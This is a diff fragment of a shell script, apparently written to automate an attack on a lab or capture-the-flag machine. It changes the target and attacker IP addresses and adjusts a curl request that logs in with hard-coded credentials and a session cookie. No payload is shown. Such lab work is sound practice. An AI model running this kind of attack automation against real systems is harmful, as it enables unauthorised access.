@@ -5,8 +5,8 @@ script=$(readlink -f $0)
 scriptpath=`dirname $script`
 
 # Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
-target_ip="10.10.195.209"
-attack_ip="10.10.113.137"
+target_ip="10.10.76.228"
+attack_ip="10.10.239.245"
 
 # Prepare environment
 mkdir /work/
@@ -26,7 +26,7 @@ echo "--> Session initiated : $PHPSESSID"
 
 # Authenticate
 echo "2 - AUTHENTICATING"
-curl -s -X POST "http://$target_ip" -b /work/1-cookies.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=noot" -d"pass=test1234" > /dev/null
+curl -s -X POST "http://$target_ip" -b /work/1-cookies.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=noot" -d "pass=test1234" > /dev/null
 
 
 # Use the PHPSESSID for the next HTTP request
